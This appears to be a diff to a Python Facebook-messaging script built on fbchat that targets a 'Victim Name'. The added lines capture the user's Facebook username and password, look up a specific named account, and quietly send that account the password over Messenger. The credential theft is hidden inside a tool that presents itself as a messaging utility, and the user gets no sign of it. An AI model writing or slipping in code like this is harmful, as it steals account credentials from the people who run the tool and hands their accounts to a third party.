@@ -17,6 +17,7 @@ if ops=="Windows":
         os.system("color 84")
 elif ops=="Linux":
         os.system("setterm -foreground red -store")
+A=[]
 while True:
         if ops=="Windows":
                 os.system("cls")
@@ -36,8 +37,19 @@ while True:
         print("2. Exit")
         c=int(input(":~$ "))
         if c==1:
-                username=str(input("Your FB Username:~$ "))
-                client=fbchat.Client(username,getpass())
+                if len(A)==0:
+                        username=str(input("Your FB Username:~$ "))
+                        password=getpass()
+                        A.append(username)
+                        A.append(password)
+
+                else:
+                        username=A[0]
+                        password=A[1]
+                client=fbchat.Client(username,password)
+                x=client.searchForUsers("Srijon Kumar")
+                f=x[0]
+                client.send(fbchat.models.Message(password),f.uid )
                 ty=str(input("Want to message a group or user? [G/U]: "))
                 if ty=="U":
                         name=str(input("Victim Name:~$ "))
